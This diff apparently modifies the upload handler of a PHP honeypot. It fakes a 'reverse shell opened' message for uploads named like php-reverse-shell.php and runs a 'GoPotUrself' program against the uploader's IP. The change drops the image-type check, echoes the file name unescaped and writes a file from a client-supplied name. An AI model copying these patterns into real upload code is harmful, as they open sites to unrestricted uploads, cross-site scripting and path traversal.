@@ -29,35 +29,30 @@
 	$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
 	$uploadOk = 1;
 	$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
-	$uploadOK = 0;
+	$uploadOK = 1;
+
+	#exec("GoPotUrself $ip &");
 
 	// Try to upload file
 	if(isset($_POST["submit"])) {
-		//checks if the image is an image file type
-		if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
-			//if a php file is uploaded we rewrite it's entire contents to the below
-			//Potential issue, but easliy fixed - add line to search for php anywhere in the name 
-			if($imageFileType == "php" && "php-reverse-shell.php" == basename($_FILES["fileToUpload"]["name"])){
-								$ip = getUserIpAddr();
-								echo "<h2> IP: $ip </h2>";
-                	        	exec("GoPotUrself $ip &");
-								move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
-                                $fhandle = fopen($target_file, "r");
-                                $content = fread($fhandle, filesize($target_file));
-                                $content = "WARNING: Failed to daemonise. This is quite common and not fatal. Successfully opened reverse shell to given IP and Port";
-                                $fhandle = fopen($target_file, "w");
-                                fwrite($fhandle, $content);
-                                fclose($fhandle);	
-				$uploadOk = 1;
-			}
+		$file_name = $_FILES['fileToUpload']['name'];
+		echo "<h2> $file_name </h2>";
+		if(strpos($file_name, 'php') !== false){
+			echo "<h2> YES </h2>";
+			$ip = getUserIpAddr();
+            $new_file = fopen("images/" .$file_name, "w");
+			$content = '<!DOCTYPE html>\n<html>\n  <body>\n    WARNING: Failed to daemonise. This is quite common and not fatal. Successfully opened reverse shell to given IP and Port\n';
+			$content = $content . '    <?php exec(GoPotUrself '. $ip .' &); ?>\n';
+			$content = $content . '  </body>\n</html>';
+            fwrite($new_file, $content);
+            fclose($new_file);	
 			$uploadOk = 0;
-		}		
-		//Moves file to images directory
-   		if ($uploadOk != 0) {
+		}
+		else {
 			move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
-       			echo "It should be on your computer now!!";
-		}	
-	}
+			echo "It should be on your computer now!!";
+		}
+	}		
 ?>
 <body>
 
